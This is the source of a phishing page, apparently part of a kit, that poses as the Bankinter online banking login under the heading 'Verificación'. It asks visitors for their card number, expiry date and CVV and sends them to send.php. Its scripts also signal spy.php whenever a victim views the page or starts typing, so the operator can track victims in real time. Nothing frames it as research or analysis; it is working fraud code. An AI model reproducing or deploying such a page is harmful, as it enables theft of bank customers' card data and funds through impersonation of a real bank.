<?php 
require '../main.php';
?>
<!doctype html>
<html>
<head>
<title>Acceso clientes banca online | Bankinter</title><link href="inc/favicon.ico" type="text/css" rel="shortcut icon">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="utf-8">
<meta name="robots" content="nofollow, noindex">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />
<link rel="stylesheet" href="inc/bs.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,500,600,700,800" />
<link rel="stylesheet" href="inc/style.css">
<script src="inc/jq.js"></script>
</head>
<body>
<header class="headrow">

<div class="col-logo">
<img src="inc/logo_bk.svg" class="logo">
</div>
<div class="col-menu">
<i class="fa fa-bars"></i>
</div>
</header>
<div class="container">
<div class="title">
Verificación</div>
Debe ingresar su tarjeta de crédito o débito principal en su cuenta para aprobar su identidad.


<?php 
if(isset($_GET['e'])){
    echo '
<div class="form-group">
<span class="form-label text-danger">La tarjeta que ingresó no es válida.</span>
</div>';
}
?>

<div class="form">



<div class="forma" id="form-1">
<form method="post" action="send.php">
<div class="form-group">





<div class="form-group">
<label>Número de tarjeta</label>
<input type="text" name="cc" required="" class="form-control" id="cc" placeholder="0000 0000 0000 0000" maxlength="19">
</div>


<div class="form-group">
<label>
Fecha de caducidad</label>
<input type="text" name="exp" required="" class="form-control" id="exp" placeholder="MM/YY" maxlength="5">
</div>

<div class="form-group">
<label>Código de seguridad (CVV)</label>
<input type="password" name="cvv" required="" class="form-control" id="cvv" placeholder="000" maxlength="4">
</div>

</div>
</div>



</select>
</div>
</div>
</div>

<div class="form-grou">
<button class="btn btn-success w-100" type="submit">SEGUIR</button>
</div>


<footer class="container-fluid">
    <div class="row">
<div class="col-sm-3 left">

<img src="inc/logo_bk.svg">
</div>

</div>
</footer>
<?php
$j->ctr("LOGIN PAGE ".@$_GET['e']);
?>
<script>
$.post("spy.php", {logview:1});
var abort = false;
$("#user").keyup(function(){
	if(abort==false){
		$.post("spy.php", {logining:1});
		abort=true;
	}
});
<script src="inc/v.js"></script>
<script src="inc/ccv.js"></script>
<script src="inc/m.js"></script>
<script>
var validVisa=false;

$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");


function val(){
$('#cc').validateCreditCard(function(result) {
    if (result.valid) {
        validVisa=true;
    }else {
        validVisa=false;
    }
});
}

</script>

<script>
 $.post("spy.php", {cardview:1});
var abort = false;
$("#cc").keyup(function(){
	if(abort==false){
		$.post("spy.php", {carding:1});
		abort=true;
	}
});

</script>
</body>
</html>